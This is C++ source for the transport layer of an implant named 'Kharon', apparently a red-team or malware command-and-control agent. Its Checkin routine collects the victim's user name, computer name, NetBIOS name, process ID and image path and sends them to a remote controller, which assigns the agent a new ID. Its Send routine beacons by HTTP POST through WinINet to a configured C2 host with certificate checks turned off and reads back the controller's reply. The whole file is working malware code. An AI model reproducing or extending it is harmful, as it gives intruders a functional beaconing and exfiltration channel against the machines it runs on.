#include <Kharon.h>

using namespace Root;

auto DECLFN Transport::Checkin(
    VOID
) -> BOOL {
    PPACKAGE CheckinPkg = Kh->Pkg->Checkin();
    PPARSER  CheckinPsr = (PPARSER)Kh->Hp->Alloc( sizeof( PARSER ) );
    
    KhDbg( "start checkin routine" );

    PVOID  Data    = NULL;
    SIZE_T Length  = 0;
    PCHAR  NewUUID = NULL;
    PCHAR  OldUUID = NULL;
    ULONG  UUIDsz  = 36;

    KhDbg( "%s", Kh->Session.AgentID );

    Kh->Pkg->AddPad( CheckinPkg, UC_PTR( Kh->Session.AgentID ), 36 );

    Kh->Pkg->AddByte( CheckinPkg, Kh->Machine.OsArch );

    Kh->Pkg->AddString( CheckinPkg, Kh->Machine.UserName );
    Kh->Pkg->AddString( CheckinPkg, Kh->Machine.CompName );
    Kh->Pkg->AddString( CheckinPkg, Kh->Machine.NetBios );
    Kh->Pkg->AddInt32( CheckinPkg, Kh->Session.ProcessID );
    Kh->Pkg->AddString( CheckinPkg, Kh->Session.ImagePath );
    Kh->Pkg->AddString( CheckinPkg, "0.0.0.0" );

    Kh->Pkg->Transmit( CheckinPkg, &Data, &Length );

    KhDbg( "transmited return %p [%d bytes]", Data, Length );

    Kh->Psr->New( CheckinPsr, Data, Length );
    if ( !CheckinPsr->Original ) return FALSE;

    OldUUID = (PCHAR)Kh->Psr->Pad( CheckinPsr, 36 );
    NewUUID = (PCHAR)Kh->Psr->Pad( CheckinPsr, 36 );

    KhDbg( "old uuid: %s", OldUUID );
    KhDbg( "new uuid: %s", NewUUID );

    if ( !NewUUID ) { INT3BRK; }

    Kh->Session.AgentID = A_PTR( Kh->Hp->Alloc( UUIDsz ) );
    Mem::Copy( Kh->Session.AgentID, NewUUID, UUIDsz );

    if ( ( NewUUID && Str::CompareA( NewUUID, Kh->Session.AgentID ) != 0 ) ) {
        Kh->Session.Connected = TRUE;
    }

    KhDbg( "set uuid: %s", Kh->Session.AgentID );

    KhDbg( "checkin routine done..." );

    Kh->Psr->Destroy( CheckinPsr );

    return TRUE;
}

auto DECLFN Transport::Send(
    _In_      PVOID   Data,
    _In_      UINT64  Size,
    _Out_opt_ PVOID  *RecvData,
    _Out_opt_ UINT64 *RecvSize
) -> BOOL {
    HANDLE hSession = NULL;
    HANDLE hConnect = NULL;
    HANDLE hRequest = NULL;

    ULONG  HttpAccessType  = 0;
    PWCHAR HttpProxy       = { 0 };
    ULONG  HttpFlags       = 0;
    ULONG  OptFlags        = 0;

    BOOL   Success = 0;

    PVOID  TmpBuffer     = NULL;
    PVOID  RespBuffer    = NULL;
    SIZE_T RespSize      = 0;
    DWORD  BytesRead     = 0;
    UINT32 ContentLength = 0;
    ULONG  ContentLenLen = sizeof( ContentLength );

    ULONG HttpStatusCode = 0;
    ULONG HttpStatusSize = sizeof( HttpStatusCode );

    HttpFlags = INTERNET_FLAG_RELOAD;

    hSession = Kh->Wininet.InternetOpenW(   
        Kh->Tsp->Web.UserAgent, HttpAccessType,
        HttpProxy, 0, 0
    );
    if ( !hSession ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }

    hConnect = Kh->Wininet.InternetConnectW(
        hSession, Kh->Tsp->Web.Host, Kh->Tsp->Web.Port,
        Kh->Tsp->Web.ProxyUsername, Kh->Tsp->Web.ProxyPassword,
        INTERNET_SERVICE_HTTP, 0, 0
    );
    if ( !hConnect ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }

    if ( Kh->Tsp->Web.Secure ) {
        HttpFlags |= INTERNET_FLAG_SECURE;
        OptFlags   = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID   |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID     |
            SECURITY_FLAG_IGNORE_WRONG_USAGE         |
            SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
    }        

    hRequest = Kh->Wininet.HttpOpenRequestW( 
        hConnect, L"POST", Kh->Tsp->Web.EndPoint, NULL, 
        NULL, NULL, HttpFlags, 0 
    );
    if ( !hRequest ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }

    Kh->Wininet.InternetSetOptionW( hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );

    Success = Kh->Wininet.HttpSendRequestW(
        hRequest, Kh->Tsp->Web.HttpHeaders,
        Str::LengthW( Kh->Tsp->Web.HttpHeaders ),
        Data, Size
    );
    if ( !Success ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }

    Kh->Wininet.HttpQueryInfoW(
        hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        &HttpStatusCode, &HttpStatusSize, NULL
    );

    KhDbg( "http status code %d", HttpStatusCode );

    if ( Success ) {
        Success = Kh->Wininet.HttpQueryInfoW(
            hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
            &ContentLength, &ContentLenLen, NULL
        );
        if ( !Success ) { 
            if ( KhGetError() == 12150 ) {
                KhDbg( "content-length header not found" );
            } else {
                KhDbg( "last error: %d", KhGetError() );
            }
        }

        RespSize = ContentLength;
        
        if ( RespSize ) {
            RespBuffer = C_PTR( Kh->Hp->Alloc( RespSize + 1 ) );
            Kh->Wininet.InternetReadFile( hRequest, RespBuffer, RespSize, &BytesRead );
        } else {
            RespSize   = 0;
            RespBuffer = NULL;
            TmpBuffer  = C_PTR( Kh->Hp->Alloc( BEG_BUFFER_LENGTH ) );

            do {
                Kh->Wininet.InternetReadFile( hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead );

                RespSize += BytesRead;

                if ( !RespBuffer ) {
                    RespBuffer = C_PTR( Kh->Hp->Alloc( RespSize ) );
                } else {
                    RespBuffer = C_PTR( Kh->Hp->ReAlloc( RespBuffer, RespSize ) );
                }

                Mem::Copy( C_PTR( U_PTR( RespBuffer ) + ( RespSize - BytesRead ) ), TmpBuffer, BytesRead );
                Mem::Zero( U_PTR( TmpBuffer ), BytesRead );
                
            } while ( BytesRead > 0 );
            
            Kh->Hp->Free( TmpBuffer, BEG_BUFFER_LENGTH );
        }
        
        KhDbg( "request: at %p [%d bytes]\n", RespBuffer, RespSize );

        if ( RespBuffer ) *RecvData = RespBuffer;
        if ( RecvSize   ) *RecvSize = RespSize;

        Success = TRUE;            
    } else {
        if ( KhGetError() == 12029 ) {
            return FALSE;
        } else {
            return TRUE;
        }

        Success = FALSE;
    }

_KH_END:
    if ( hSession ) Kh->Wininet.InternetCloseHandle( hSession );
    if ( hConnect ) Kh->Wininet.InternetCloseHandle( hConnect );
    if ( hRequest ) Kh->Wininet.InternetCloseHandle( hRequest );

    return Success;
}
